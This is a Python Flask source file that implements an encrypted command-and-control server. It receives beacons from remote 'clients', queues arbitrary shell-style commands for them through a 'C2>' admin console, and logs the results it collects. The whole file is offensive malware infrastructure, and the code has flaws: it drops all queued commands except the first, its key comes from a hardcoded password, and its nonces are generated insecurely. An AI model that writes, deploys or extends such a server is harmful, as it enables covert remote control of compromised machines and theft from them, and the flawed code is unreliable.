from flask import Flask, request, jsonify
import base64, json, hashlib
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import threading
import time
import random

app = Flask(__name__)

PASSWORD = "YourStrongPassword"
KEY = hashlib.sha256(PASSWORD.encode()).digest()

# Command queues: client_id -> [commands]
command_queues = {}
command_lock = threading.Lock()

# Result logs (can be purged)
result_logs = []
result_lock = threading.Lock()

# Rate limiting config (simple)
client_last_request = {}
RATE_LIMIT_SECONDS = 1

def encrypt(data):
    nonce = random.randbytes(12)
    return nonce + AESGCM(KEY).encrypt(nonce, data, None)

def decrypt(data):
    return AESGCM(KEY).decrypt(data[:12], data[12:], None)

@app.route("/api", methods=["POST"])
def api():
    client_ip = request.remote_addr
    now = time.time()
    # Simple rate limiting
    last_time = client_last_request.get(client_ip, 0)
    if now - last_time < RATE_LIMIT_SECONDS:
        return jsonify({"error": "Rate limit exceeded"}), 429
    client_last_request[client_ip] = now

    data = request.json.get("data")
    if not data:
        return jsonify({"error": "Missing data"}), 400

    try:
        enc_data = base64.b64decode(data)
        dec = decrypt(enc_data)
        payload = json.loads(dec)
    except Exception as e:
        return jsonify({"error": "Decryption or JSON error"}), 400

    client_id = payload.get("client_id")
    action = payload.get("action")

    # Store result logs
    if action not in ["heartbeat", "sysinfo", "netinfo"]:
        with result_lock:
            result_logs.append({
                "client_id": client_id,
                "action": action,
                "result": payload.get("result", ""),
                "timestamp": time.time()
            })
    # On heartbeat, send commands if any
    cmds = []
    with command_lock:
        cmds = command_queues.get(client_id, [])
        command_queues[client_id] = []

    response = {"command": cmds.pop(0) if cmds else ""}

    enc_resp = encrypt(json.dumps(response).encode())
    resp_b64 = base64.b64encode(enc_resp).decode()
    return jsonify(resp_b64)

# Add command to a client's queue
def queue_command(client_id, command):
    with command_lock:
        if client_id not in command_queues:
            command_queues[client_id] = []
        command_queues[client_id].append(command)

# Admin console (very basic CLI) for demo purposes
def admin_console():
    while True:
        cmd = input("C2> ")
        if cmd.startswith("send "):
            parts = cmd.split(" ", 2)
            if len(parts) < 3:
                print("Usage: send <client_id> <command>")
                continue
            client_id, command = parts[1], parts[2]
            queue_command(client_id, command)
        elif cmd == "clients":
            with command_lock:
                print("Clients:", list(command_queues.keys()))
        elif cmd == "logs":
            with result_lock:
                for entry in result_logs[-10:]:
                    print(entry)
        elif cmd == "exit":
            break
        else:
            print("Unknown command")

if __name__ == "__main__":
    import threading
    t = threading.Thread(target=admin_console)
    t.daemon = True
    t.start()
    app.run(host="0.0.0.0", port=5000)
